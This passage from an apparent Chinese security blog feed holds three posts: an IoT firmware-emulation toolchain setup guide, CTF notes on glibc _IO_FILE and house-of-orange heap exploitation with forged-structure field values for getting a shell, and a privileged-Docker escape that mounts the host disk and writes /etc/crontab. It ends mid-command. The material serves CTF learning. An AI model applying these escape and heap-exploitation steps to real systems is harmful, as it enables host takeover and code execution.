class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Java</span> <span class="hljs-number">11</span> <span class="hljs-number">64</span>-bit<br></code></pre></td></tr></table></figure><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>我们可以选择直接安装binwalk,但是这样安装的binwalk功能上可能会有些缺陷,有些固件会无法提取,因此这里采取下载源代码自己编译的方法来安装</p><ol><li>直接安装方法</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install binwalk<br></code></pre></td></tr></table></figure><ol start="2"><li>下载源代码自己编译</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install git build-essential autoconf<br>sudo git clone https://github.<span class="hljs-keyword">com</span>/devttys0/binwalk.git<br>sudo apt-<span class="hljs-built_in">get</span> install libqt4-opengl <span class="hljs-keyword">python</span>-qt4 <span class="hljs-keyword">python</span>-qt4-gl <span class="hljs-keyword">python</span>-numpy <span class="hljs-keyword">python</span>-scipy <span class="hljs-keyword">python</span>-pip<br>sudo pip install pyqtgraph<br>sudo apt-<span class="hljs-built_in">get</span> install zlib1g-dev liblzma-dev liblzo2-dev <br>git clone https://github.<span class="hljs-keyword">com</span>/devttys0/sasquatch<br><span class="hljs-keyword">cd</span> sasquatch &amp;&amp; sudo <span class="hljs-keyword">make</span> &amp;&amp; sudo <span class="hljs-keyword">make</span> install<br>sudo <span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> install <br></code></pre></td></tr></table></figure><h3 id="sasquatch-SquashFSt提取工具"><a href="#sasquatch-SquashFSt提取工具" class="headerlink" title="sasquatch SquashFSt提取工具"></a>sasquatch SquashFSt提取工具</h3><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install zlib1g-<span class="hljs-built_in">dev</span> liblzma-<span class="hljs-built_in">dev</span> liblzo2-<span class="hljs-built_in">dev</span><br><br></code></pre></td></tr></table></figure><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>和Binwalk相同,也有两种方法</p><ol><li>直接安装一步到位</li></ol><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt <span class="hljs-keyword">install </span>libglib2.<span class="hljs-number">0</span>-dev libgcrypt20-dev autoconf automake libtool <br>sudo apt-get <span class="hljs-keyword">install </span>libglib2.<span class="hljs-number">0</span> libglib2.<span class="hljs-number">0</span>-dev<br>sudo apt <span class="hljs-keyword">install </span>-y pkg-<span class="hljs-built_in">config</span><br>sudo apt <span class="hljs-keyword">install </span>-y libpixman<span class="hljs-number">-1</span>-dev<br>sudo apt <span class="hljs-keyword">install </span>-y libfdt-dev<br>sudo apt <span class="hljs-keyword">install </span>libsdl2-dev  <br>sudo apt <span class="hljs-keyword">install </span>libsnappy-dev<br>sudo apt <span class="hljs-keyword">install </span>libgtk<span class="hljs-number">-3</span>-dev<br>sudo apt <span class="hljs-keyword">install </span>libjpeg-turbo8-dev<br>sudo apt <span class="hljs-keyword">install </span>libcurl4-openssl-dev<br>sudo apt <span class="hljs-keyword">install </span>libspice-server-dev<br>sudo apt-get <span class="hljs-keyword">install </span>qemu<br></code></pre></td></tr></table></figure><ol start="2"><li><p>自己编译</p><ol><li>git</li></ol> <figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs q">git clone git:<span class="hljs-comment">//git.qqmu-project.org/qemu.git/qemu.git</span><br>git submodule <span class="hljs-keyword">update</span> --init pixman<br>git submodule <span class="hljs-keyword">update</span> --init dtc<br>sudo apt install libglib2<span class="hljs-number">.0</span>-<span class="hljs-built_in">dev</span> libgcrypt20-<span class="hljs-built_in">dev</span> autoconf automake libtool <br>sudo apt-<span class="hljs-built_in">get</span> install libglib2<span class="hljs-number">.0</span> libglib2<span class="hljs-number">.0</span>-<span class="hljs-built_in">dev</span><br>sudo apt install -y pkg-config<br>sudo apt install -y libpixman<span class="hljs-number">-1</span>-<span class="hljs-built_in">dev</span><br>sudo apt install -y libfdt-<span class="hljs-built_in">dev</span><br>sudo apt install libsdl2-<span class="hljs-built_in">dev</span>  <br>sudo apt install libsnappy-<span class="hljs-built_in">dev</span><br>sudo apt install libgtk<span class="hljs-number">-3</span>-<span class="hljs-built_in">dev</span><br>sudo apt install libjpeg-turbo8-<span class="hljs-built_in">dev</span><br>sudo apt install libcurl4-openssl-<span class="hljs-built_in">dev</span><br>sudo apt install libspice-server-<span class="hljs-built_in">dev</span><br>sudo ./configure --static &amp;&amp; sudo make -j8 &amp;&amp; sudo make install<br><br>注: 使用configure 使用static参数的时候,依赖可能会根据不同环境导致依赖缺失,可以根据报错来解决依赖问题<br></code></pre></td></tr></table></figure><ol start="2"><li>wget<br> 可根据需求不同来选择不同的版本</li></ol> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> apt install libglib2.<span class="hljs-number">0</span>-dev libgcrypt20-dev autoconf automake libtool <br><span class="hljs-attribute">sudo</span> apt-get install libglib2.<span class="hljs-number">0</span> libglib2.<span class="hljs-number">0</span>-dev<br><span class="hljs-attribute">sudo</span> apt install -y pkg-config<br><span class="hljs-attribute">sudo</span> apt install -y libpixman-<span class="hljs-number">1</span>-dev<br><span class="hljs-attribute">sudo</span> apt install -y libfdt-dev<br><span class="hljs-attribute">sudo</span> apt install libsdl2-dev  <br><span class="hljs-attribute">sudo</span> apt install libsnappy-dev<br><span class="hljs-attribute">sudo</span> apt install libgtk-<span class="hljs-number">3</span>-dev<br><span class="hljs-attribute">sudo</span> apt install libjpeg-turbo8-dev<br><span class="hljs-attribute">sudo</span> apt install libcurl4-openssl-dev<br><span class="hljs-attribute">sudo</span> apt install libspice-server-dev<br><span class="hljs-attribute">sudo</span> arm-softmmu<br><span class="hljs-attribute">wget</span> https://download.qemu.org/qemu-<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.tar.xz<br><span class="hljs-attribute">tar</span> xvJf qemu-<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.tar.xz<br><span class="hljs-attribute">cd</span> qemu-<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">sudo</span> ./configure --target-list=arm-softmmu,mips-softmmu,mipsel-softmmu --audio-drv-list=alsa,pa<br><span class="hljs-attribute">sudo</span> make -j8<br><span class="hljs-attribute">sudo</span> make install<br></code></pre></td></tr></table></figure></li><li><p>这里也贴出官方的安装教程</p><ol><li>To download and build QEMU 4.1.0:</li></ol> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://download.qemu.org/qemu-4.1.0.tar.xz<br>tar xvJf qemu-4.1.0.tar.xz<br><span class="hljs-built_in">cd</span> qemu-4.1.0<br>./configure<br>make<br></code></pre></td></tr></table></figure><ol start="2"><li>To download and build QEMU from git:</li></ol> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://git.qemu.org/git/qemu.git<br><span class="hljs-built_in">cd</span> qemu<br>git submodule init<br>git submodule update --recursive<br>./configure<br>make<br></code></pre></td></tr></table></figure><ol start="3"><li>Debian&#x2F;Ubuntu:</li></ol> <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install qemu<br></code></pre></td></tr></table></figure></li></ol><h2 id="MIPS交叉编译环境"><a href="#MIPS交叉编译环境" class="headerlink" title="MIPS交叉编译环境"></a>MIPS交叉编译环境</h2><p>在x86平台上编译MIPS架构的应用程序,需要我们在Ubuntu下建立交叉编译环境,编译过程中,会下载一些依赖包,需要网络畅通,这里有一个点很难受,就是如果你的内核版本在选项中没有出现的时候,可能需要我们选择更高版本的内核版本</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install libncurses5-dev patch<br>sudo apt-<span class="hljs-built_in">get</span> install libncurses-dev ncurses-devel<br>sudo apt-<span class="hljs-built_in">get</span> install libncurs*<br>wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2<br>tar -jxvf buildroot-snapshots.tar.bz2<br><span class="hljs-keyword">cd</span> buildroot/<br><span class="hljs-keyword">make</span> clean<br><span class="hljs-keyword">make</span> menuconfig<br>sudo <span class="hljs-keyword">make</span> -j8<br></code></pre></td></tr></table></figure><p>在make menuconfig那一步的时候,我们需要更改几个地方</p><ol><li>“Target Architecture”改为”MIPS(littke endian)</li><li>“Target Architecture Variant”改成”mips32”</li><li>“tool chains”-&gt;”Kernel Headers”改成机器环境的kernel版本,可使用<em>uname -r</em>查看<br>本机内核版本,如果没有,可以选择4.4</li></ol><p><em><strong>笔者本机的内核版本是4.15,但是选项中没有4.15,因此我开始时选择了4.14,但是在编译过程中,4.14会在下载时报404,因此推荐选择4.4.x</strong></em></p><p>然后<em>sudo make -j8</em>即可</p><p><em><strong>注:这里需要保持网络联通,编译时间可能需要很久</strong></em></p><h3 id="firmadyne"><a href="#firmadyne" class="headerlink" title="firmadyne"></a>firmadyne</h3><p>一个非常简单的路由器运行环境,此环境下无法调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan<br>git <span class="hljs-built_in">clone</span> --recursive https://github.com/firmadyne/firmadyne.git<br><br>之后要进入到文件夹内,修改firmadyne.config,将其中的<br><br>FIRMWARE_DIR=/home/vagrant/firmadyne/<br>修改为完整路径<br>然后可以执行安装<br><span class="hljs-built_in">sudo</span> ./download.sh<br><span class="hljs-built_in">sudo</span> -H pip install git+https://github.com/ahupp/python-magic<br><span class="hljs-built_in">sudo</span> -H pip install git+https://github.com/sviehb/jefferson<br><span class="hljs-built_in">sudo</span> apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils<br><span class="hljs-built_in">sudo</span> apt-get install postgresql<br><span class="hljs-built_in">sudo</span> -u postgres createuser -P firmadyne<br><span class="hljs-built_in">sudo</span> -u postgres createdb -O firmadyne firmware<br><span class="hljs-built_in">sudo</span> -u postgres psql -d firmware &lt; ./firmadyne/database/schema<br></code></pre></td></tr></table></figure><p>之后就可以利用这个模拟固件了</p><p>到此基本的环境就基本搭建完毕了,enjoy:)</p>]]></content>
    
    
    
    <tags>
      
      <tag>iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>教练,我还想用IO</title>
    <link href="/2019/11/02/%E6%95%99%E7%BB%83-%E6%88%91%E8%BF%98%E6%83%B3%E7%94%A8IO/"/>
    <url>/2019/11/02/%E6%95%99%E7%BB%83-%E6%88%91%E8%BF%98%E6%83%B3%E7%94%A8IO/</url>
    
    <content type="html"><![CDATA[<blockquote><p>IO的利用在现在的pwn题里越来越常见夜越来越多了,虽然house of orange已经是angelboy大神在hitcon 2016里提出的了,但是现在还是很常用,这里吐槽一下hitcon2019还是很变态2333,鉴于现在的使用越来越多,这里打算重新学习一下IO,鉴于水平问题,所不及之处或错误之处还望海涵并与我联系,因为之前已经写过一篇IO的,所有对IO不了解的可以先看一下我之前的文章<br><a href="https://nightrainy.github.io/2019/08/03/IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%A9%E7%94%A8/">_IO_FILE结构体利用</a></p></blockquote><p>这里贴两个链接,以表自己对angelboy师傅的膜拜</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">4</span>ngelboy.blogspot.com/<span class="hljs-number">2016</span>/<span class="hljs-number">10</span>/hitcon-ctf-qual-<span class="hljs-number">2016</span>-house-of-orange.html<br><br><span class="hljs-attribute">http</span>://blog.angelboy.tw/<br></code></pre></td></tr></table></figure><h2 id="house-of-orange再浅析"><a href="#house-of-orange再浅析" class="headerlink" title="house of orange再浅析"></a>house of orange再浅析</h2><h3 id="house-of-orange的使用条件"><a href="#house-of-orange的使用条件" class="headerlink" title="house of orange的使用条件"></a>house of orange的使用条件</h3><ol><li>可以泄露heap和libc基址</li><li>可以触发unsorted bin attack</li><li>有空间让我们伪造FILE结构体</li></ol><p>而条件一可以使用unsortedbin和small bin来泄露</p><p>原题的难点在于没有提供free函数,而在这种情况下我们该如何制造一个unsorted bin就是难以解决的问题了</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>关于第一个其实有一个小trick,也是一个小机制</p><p>我们知道我们malloc块的时候,一般都是在top chunk处切一小块下来给我们,但是当我们申请的大小大于top chunk的size且不会使用mmap拓展(即仅仅是brk)的时候,就会把现在的top chunk变成unsorted bin chunk,此时我们就可以利用这个unsorted bin来泄露了</p><p>剩下的就是我们该如何伪造FILE结构体了</p><p>而我们知道通过unsorted bin attack 可以向任意地址写如main_arena结构体中的top对应地址值</p><p>struct main_arena:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">malloc_state</span> main_arena =<br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>这里就先到此为止,下面我们进入正题,IO的利用</p><h3 id="IO来了"><a href="#IO来了" class="headerlink" title="IO来了"></a>IO来了</h3><p>我们知道我们日常使用的一个代码比如:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">FILE</span> *fd=fopen(<span class="hljs-string">&#x27;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>此时系统并不会直接给fd分配一个_IO_FILE指针,其实他分配给FD的是_IO_FILE_plus结构体,</p><p>这里也贴一下方便查看</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">struct</span> _IO_FILE_plus<br>&#123;<br>    <span class="hljs-attribute">_IO_FILE</span>    file;<br>    <span class="hljs-attribute">IO_jump_t</span>   *vtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>而我们的vtable虚表的结构是这样的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">void * funcs[] = &#123;<br>   <span class="hljs-number">1</span> NULL, <span class="hljs-regexp">//</span> <span class="hljs-string">&quot;extra word&quot;</span><br>   <span class="hljs-number">2</span> NULL, <span class="hljs-regexp">//</span> DUMMY<br>   <span class="hljs-number">3</span> <span class="hljs-keyword">exit</span>, <span class="hljs-regexp">//</span> finish<br>   <span class="hljs-number">4</span> NULL, <span class="hljs-regexp">//</span> overflow<br>   <span class="hljs-number">5</span> NULL, <span class="hljs-regexp">//</span> underflow<br>   <span class="hljs-number">6</span> NULL, <span class="hljs-regexp">//</span> uflow<br>   <span class="hljs-number">7</span> NULL, <span class="hljs-regexp">//</span> pbackfail<br>   <br>   <span class="hljs-number">8</span> NULL, <span class="hljs-regexp">//</span> xsputn  <span class="hljs-comment">#printf</span><br>   <span class="hljs-number">9</span> NULL, <span class="hljs-regexp">//</span> xsgetn<br>   <span class="hljs-number">10</span> NULL, <span class="hljs-regexp">//</span> seekoff<br>   <span class="hljs-number">11</span> NULL, <span class="hljs-regexp">//</span> seekpos<br>   <span class="hljs-number">12</span> NULL, <span class="hljs-regexp">//</span> setbuf<br>   <span class="hljs-number">13</span> NULL, <span class="hljs-regexp">//</span> sync<br>   <span class="hljs-number">14</span> NULL, <span class="hljs-regexp">//</span> doallocate<br>   <span class="hljs-number">15</span> NULL, <span class="hljs-regexp">//</span> read<br>   <span class="hljs-number">16</span> NULL, <span class="hljs-regexp">//</span> write<br>   <span class="hljs-number">17</span> NULL, <span class="hljs-regexp">//</span> seek<br>   <span class="hljs-number">18</span> pwn,  <span class="hljs-regexp">//</span> close<br>   <span class="hljs-number">19</span> NULL, <span class="hljs-regexp">//</span> stat<br>   <span class="hljs-number">20</span> NULL, <span class="hljs-regexp">//</span> showmanyc<br>   <span class="hljs-number">21</span> NULL, <span class="hljs-regexp">//</span> imbue<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里要特地提一下,house of orange这道题的环境还是libc2.23,也就意味着我们可以直接更改vtable来改变程序的执行流程hhh</p><p>而我们如何跳到vtable_IO_jump_t执行呢,这也很简单,只要构造一个错误就好,我们可以通过unsorted bin attack 来使得malloc出错,从而调用malloc_printerr,然后的调用链如下所示:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">malloc_printerr</span>-&gt;</span>__<span class="hljs-function"><span class="hljs-title">libc_message</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">abort</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fflush</span>(_IO_flush_all_lockp)-&gt;</span><span class="hljs-function"><span class="hljs-title">vtable</span>-&gt;</span>_IO_OVERFLOW(<span class="hljs-function"><span class="hljs-title">hijack</span>-&gt;</span>system)<br></code></pre></td></tr></table></figure><p>此时就可以完成整个调用链来获得shell<br>而且此时有两种绕过check的构造方式</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">1</span>.<span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_mode &lt;= <span class="hljs-number">0</span><br><span class="hljs-number">2</span>.<span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_IO_write_base<br>或<br><span class="hljs-number">1</span>._IO_vtable_offset (fp) == <span class="hljs-number">0</span><br><span class="hljs-number">2</span>.<span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_mode &gt; <span class="hljs-number">0</span><br><span class="hljs-number">3</span>.<span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base<br></code></pre></td></tr></table></figure><h2 id="libc-2-23"><a href="#libc-2-23" class="headerlink" title="libc&gt;2.23"></a>libc&gt;2.23</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>之前的文章也有提及,在libc&gt;2.23之后,glibc就添加了一个新的check函数(_IO_vtable_check)</p><p>虽然我们不能随意伪造一个新的结构了,但是libc段上的__libc_IO_vtables还是可以用的,那么我们,而我们只需要更改_IO_str_jumps的虚表_IO_str_overflow即可,然后如下构造即可:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">_flags</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">_IO_write_ptr</span> = <span class="hljs-number">0</span>x7fffffffffffffff<br><span class="hljs-attr">_IO_write_base</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">_IO_buf_end</span> = (binsh_addr-<span class="hljs-number">100</span>)/<span class="hljs-number">2</span><br><span class="hljs-attr">_IO_buf_base</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这个方法来自V神的思考:即修改(_IO_str_finish)<a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more">链接</a></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sqf">void<br><span class="hljs-variable">_IO_str_finish</span> (<span class="hljs-variable">_IO_FILE</span> *fp, int dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;<span class="hljs-variable">_IO_buf_base</span> &amp;&amp; !(fp-&gt;<span class="hljs-variable">_flags</span> &amp; <span class="hljs-variable">_IO_USER_BUF</span>)) <span class="hljs-comment">//唯一需要bypass的条件</span><br>    (((<span class="hljs-variable">_IO_strfile</span> *) fp)-&gt;<span class="hljs-variable">_s</span>.<span class="hljs-variable">_free_buffer</span>) (fp-&gt;<span class="hljs-variable">_IO_buf_base</span>);<span class="hljs-comment">// getshell ， [fp+0xe8]</span><br>  fp-&gt;<span class="hljs-variable">_IO_buf_base</span> = NULL;<br><br>  <span class="hljs-variable">_IO_default_finish</span> (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="利用stdout泄露地址"><a href="#利用stdout泄露地址" class="headerlink" title="利用stdout泄露地址"></a>利用stdout泄露地址</h2><p>在没有输出函数的情况下,我们该如何泄露地址呢?</p><p>我们只需要劫持stdout指针即可<br>一般来说是通过UAF，接着改FD的main_arena+88的末位<br>如果没有则利用攻击global_max_fast的方式去做，然后利用fastbin attack，变成stdout-xx的位置(得有0x7f或者0xff的size，0x7f在0x43的位置，0xff在0x51的位置)，下一次申请时就可以从上往下写，改写flag标志位为0xfbad1800固定值，同时修改IO_Write_base末尾为’\x00’，在flag位和IO_Write_base位之间填写的东西可以为任意值，我们的目的是下溢改写IO_Write_base</p><p>写到这里就差的不多结束了,因为发现了一篇写的更优秀的文章,为了避免重复造轮子,这里贴出来<a href="https://www.anquanke.com/post/id/168802#h2-9">https://www.anquanke.com/post/id/168802#h2-9</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>play_with_docker</title>
    <link href="/2019/10/31/play-with-docker/"/>
    <url>/2019/10/31/play-with-docker/</url>
    
    <content type="html"><![CDATA[<blockquote><p>数字云是第一次线下打real world模式,题目质量很高,深感自己所学知识的匮乏,因此特地学习了一波docker相关的知识,其实题目很简单,都怪自己太菜了走入了死胡同</p></blockquote><h1 id="docker在特权模式下启动的逃逸"><a href="#docker在特权模式下启动的逃逸" class="headerlink" title="docker在特权模式下启动的逃逸"></a>docker在特权模式下启动的逃逸</h1><h2 id="开启–privileged-的情况下-或者使用—cap-add-SYSADMIN参数启动时"><a href="#开启–privileged-的情况下-或者使用—cap-add-SYSADMIN参数启动时" class="headerlink" title="开启–privileged 的情况下(或者使用—cap-add&#x3D;SYSADMIN参数启动时)"></a>开启–privileged 的情况下(或者使用—cap-add&#x3D;SYSADMIN参数启动时)</h2><p>我们知道在版本6.0以后docker引入了特权模式</p><p>特权模式下允许容器内的root几乎拥有外部物理机的root级别权限，而在此之前容器内root用户仅拥有外部物理机普通用户权限。</p><p>因此,在开启了privileged的时候,我们就可以通过mount命令将外部宿主的磁盘挂载在容器内部,此时也就获得了宿主机的读写权限</p><p>比如我们以特权模式开启一个docker,此时利用 <em>fdisk -l</em> 命令来查看磁盘文件:</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@ed1221982ba0:~<span class="hljs-comment"># fdisk -l</span><br>Disk /dev/sda:<span class="hljs-number"> 20 </span>GiB,<span class="hljs-number"> 21474836480 </span>bytes,<span class="hljs-number"> 41943040 </span>sectors<br>Units: sectors of<span class="hljs-number"> 1 </span>*<span class="hljs-number"> 512 </span>=<span class="hljs-number"> 512 </span>bytes<br>Sector size (logical/physical):<span class="hljs-number"> 512 </span>bytes /<span class="hljs-number"> 512 </span>bytes<br>I/O size (minimum/optimal):<span class="hljs-number"> 512 </span>bytes /<span class="hljs-number"> 512 </span>bytes<br>Disklabel type: dos<br>Disk identifier: 0x6e32e1c3<br><br>Device     Boot Start      End  Sectors Size Id Type<br>/dev/sda1  *    <span class="hljs-number"> 2048 </span>41940991<span class="hljs-number"> 41938944 </span> 20G<span class="hljs-number"> 83 </span>Linux<br><br></code></pre></td></tr></table></figure><p>此时我们就可以把sda1挂载到我们的容器内</p><ol><li>mkdir &#x2F;xyz</li><li>mount &#x2F;dev&#x2F;sda1 &#x2F;xyz</li></ol><p>此时我们访问&#x2F;xyz就可以访问到宿主机了,并且是拥有读写权限的,执行命令我们也可以通过写入 <em>&#x2F;etc&#x2F;crontab</em> 文件来执行命令(比如弹计算器QAQ)</p><h1 id="数字云线下docker解法"><a href="#数字云线下docker解法" class="headerlink" title="数字云线下docker解法"></a>数字云线下docker解法</h1><p>线下的时候里一血和做不出来差了一个字符,导致这篇文章咕咕咕了很久</p><p>题目要求是ssh上宿主机起的docker,然后在宿主机弹出计算器即可,给了宿主机启动docker前的的两行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> insmod /home/b/de.ko<br><span class="hljs-built_in">sudo</span> docker run -itd --privileged -p 0.0.0.0:23:22 d77241e92fe6 /bin/bash -c <span class="hljs-string">&quot;/etc/init.d/ssh 